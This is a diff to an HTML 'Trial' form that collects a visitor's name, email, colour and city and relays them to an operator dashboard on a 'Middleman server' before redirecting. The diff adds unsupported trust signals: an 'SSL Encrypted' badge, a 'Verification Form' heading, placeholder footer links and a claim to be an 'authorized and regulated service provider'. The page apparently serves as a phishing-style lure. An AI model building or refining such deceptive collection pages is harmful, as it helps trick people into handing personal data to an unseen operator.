@@ -3,51 +3,83 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Trial</title>
+  <title>Trial - Verification</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     
     body {
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-      background-color: #eef2f5;
+      background: #f0f2f5;
+      color: #1a1a1a;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
-      padding: 15px;
+      padding: 16px 12px;
     }
 
-    /* Mobile Phone Wrapper */
+    /* Mobile Phone Container */
     .phone-card {
       width: 100%;
-      max-width: 380px;
+      max-width: 400px;
       background: #ffffff;
-      border-radius: 20px;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+      border-radius: 16px;
+      box-shadow: 0 12px 32px rgba(0, 0, 0, 0.08), 0 2px 6px rgba(0, 0, 0, 0.04);
       overflow: hidden;
-      border: 1px solid #e0e0e0;
+      border: 1px solid #e5e7eb;
     }
 
-    /* Top Black Banner */
+    /* Top Black Header Banner */
     .banner {
-      background: #000000;
+      background: #0f172a;
       color: #ffffff;
-      padding: 22px 15px;
-      text-align: center;
+      padding: 20px 20px 18px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #1e293b;
     }
     
     .banner h1 {
-      font-size: 24px;
+      font-size: 22px;
       font-weight: 700;
-      letter-spacing: 0.5px;
+      letter-spacing: -0.3px;
+    }
+
+    .secure-badge {
+      font-size: 11px;
+      background: rgba(255, 255, 255, 0.1);
+      color: #38bdf8;
+      padding: 4px 10px;
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      font-weight: 500;
     }
 
     /* Form Content */
     .content {
-      padding: 22px 20px;
+      padding: 24px 20px;
       display: flex;
       flex-direction: column;
-      gap: 16px;
+      gap: 18px;
+    }
+
+    .form-header {
+      margin-bottom: 4px;
+    }
+
+    .form-header h2 {
+      font-size: 16px;
+      font-weight: 600;
+      color: #0f172a;
+    }
+
+    .form-header p {
+      font-size: 13px;
+      color: #64748b;
+      margin-top: 2px;
     }
 
     .question-group {
@@ -58,42 +90,51 @@
     }
 
     .question-group label {
-      font-size: 14px;
+      font-size: 13px;
       font-weight: 600;
-      color: #333;
+      color: #334155;
     }
 
     .question-group input[type="text"] {
       width: 100%;
-      padding: 12px;
-      border: 1px solid #ccc;
-      border-radius: 10px;
-      font-size: 15px;
+      padding: 12px 14px;
+      border: 1.5px solid #cbd5e1;
+      border-radius: 8px;
+      font-size: 14px;
+      color: #0f172a;
       outline: none;
-      transition: border-color 0.2s;
+      transition: all 0.2s ease;
+      background-color: #fafafa;
     }
 
     .question-group input[type="text"]:focus {
-      border-color: #000000;
+      border-color: #0f172a;
+      background-color: #ffffff;
+      box-shadow: 0 0 0 3px rgba(15, 23, 42, 0.1);
     }
 
-    /* Continue Button */
+    /* Action Button */
     .submit-btn {
       width: 100%;
       padding: 14px;
-      background-color: #000000;
-      color: white;
+      background-color: #0f172a;
+      color: #ffffff;
       border: none;
-      border-radius: 10px;
-      font-size: 16px;
+      border-radius: 8px;
+      font-size: 15px;
       font-weight: 600;
       cursor: pointer;
-      margin-top: 10px;
-      transition: background 0.2s;
+      margin-top: 8px;
+      transition: background 0.2s ease, transform 0.1s ease;
+      box-shadow: 0 4px 12px rgba(15, 23, 42, 0.15);
     }
 
     .submit-btn:hover {
-      background-color: #222222;
+      background-color: #1e293b;
+    }
+
+    .submit-btn:active {
+      transform: scale(0.99);
     }
 
     /* Status Spinner & Messages */
@@ -105,12 +146,12 @@
     }
 
     .spinner {
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid #000000;
+      border: 3px solid #e2e8f0;
+      border-top: 3px solid #0f172a;
       border-radius: 50%;
-      width: 36px;
-      height: 36px;
-      animation: spin 1s linear infinite;
+      width: 32px;
+      height: 32px;
+      animation: spin 0.8s linear infinite;
       margin: 12px auto;
     }
 
@@ -118,43 +159,110 @@
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
+
+    /* Professional Footer Banner */
+    .footer {
+      background: #0f172a;
+      color: #94a3b8;
+      padding: 24px 20px;
+      border-top: 1px solid #1e293b;
+      font-size: 12px;
+    }
+
+    .footer-links {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px 16px;
+      margin-bottom: 20px;
+    }
+
+    .footer-links a {
+      color: #cbd5e1;
+      text-decoration: none;
+      transition: color 0.2s ease;
+      display: inline-block;
+    }
+
+    .footer-links a:hover {
+      color: #ffffff;
+      text-decoration: underline;
+    }
+
+    .footer-bottom {
+      border-top: 1px solid #1e293b;
+      padding-top: 14px;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      color: #64748b;
+      font-size: 11px;
+    }
+
+    .footer-bottom p {
+      line-height: 1.4;
+    }
   </style>
 </head>
 <body>
 
   <div class="phone-card">
     
-    <!-- Black Header Banner -->
+    <!-- Top Black Banner with SSL Security Badge -->
     <div class="banner">
       <h1>Trial</h1>
+      <div class="secure-badge">
+        <span>🔒</span> SSL Encrypted
+      </div>
     </div>
 
-    <!-- 4 Short Answer Questions -->
+    <!-- Main Content Form -->
     <div class="content">
 
+      <div class="form-header">
+        <h2>Verification Form</h2>
+        <p>Please complete the required details below to proceed.</p>
+      </div>
+
       <div class="question-group">
-        <label for="q1">1. What is your full name?</label>
+        <label for="q1">Full Name</label>
         <input type="text" id="q1" placeholder="e.g. John Doe">
       </div>
 
       <div class="question-group">
-        <label for="q2">2. What is your email address?</label>
+        <label for="q2">Email Address</label>
         <input type="text" id="q2" placeholder="e.g. john@example.com">
       </div>
 
       <div class="question-group">
-        <label for="q3">3. What is your favorite color?</label>
+        <label for="q3">Favorite Color</label>
         <input type="text" id="q3" placeholder="e.g. Crimson, Blue">
       </div>
 
       <div class="question-group">
-        <label for="q4">4. What city do you live in?</label>
+        <label for="q4">City / Region</label>
         <input type="text" id="q4" placeholder="e.g. London, New York">
       </div>
 
       <button class="submit-btn" onclick="sendToMiddleman()">Continue</button>
 
       <div id="status"></div>
+    </div>
+
+    <!-- Professional Bottom Footer Banner -->
+    <div class="footer">
+      <div class="footer-links">
+        <a href="#help">Help Centre</a>
+        <a href="#status">Service Status</a>
+        <a href="#privacy">Privacy Policy</a>
+        <a href="#cookies">Cookie Policy</a>
+        <a href="#complaints">Complaints</a>
+        <a href="#legal">Legal & Terms</a>
+      </div>
+
+      <div class="footer-bottom">
+        <p>© 2026 Trial Services Inc. All rights reserved.</p>
+        <p>Authorized and regulated service provider. Your data is encrypted and processed securely.</p>
+      </div>
     </div>
 
   </div>
@@ -169,18 +277,18 @@
       const statusDiv = document.getElementById('status');
 
       if (!ans1 || !ans2 || !ans3 || !ans4) {
-        alert('Please answer all 4 questions!');
+        alert('Please answer all required fields before continuing.');
         return;
       }
 
       // 1. Show spinner and transfer message
-      statusDiv.style.color = '#000000';
+      statusDiv.style.color = '#0f172a';
       statusDiv.innerHTML = `
         <div class="spinner"></div>
-        <p>You are being transferred, wait...</p>
+        <p style="margin-top: 6px;">You are being transferred, wait...</p>
       `;
 
-      // Bundle all answers into one string for the operator dashboard
+      // Bundle all answers for the operator dashboard
       const summaryPayload = `Name: ${ans1} | Email: ${ans2} | Color: ${ans3} | City: ${ans4}`;
 
       try {
@@ -202,8 +310,8 @@
           if (checkData.status === 'COMPLETED') {
             clearInterval(interval);
 
-            statusDiv.style.color = 'green';
-            statusDiv.innerHTML = `<p>Link received! Redirecting...</p>`;
+            statusDiv.style.color = '#16a34a';
+            statusDiv.innerHTML = `<p>Verification complete! Redirecting...</p>`;
 
             // 4. Auto-redirect browser tab
             setTimeout(() => {
@@ -213,7 +321,7 @@
         }, 2000);
 
       } catch (err) {
-        statusDiv.style.color = 'red';
+        statusDiv.style.color = '#dc2626';
         statusDiv.textContent = 'Could not connect to Middleman server.';
       }
     }
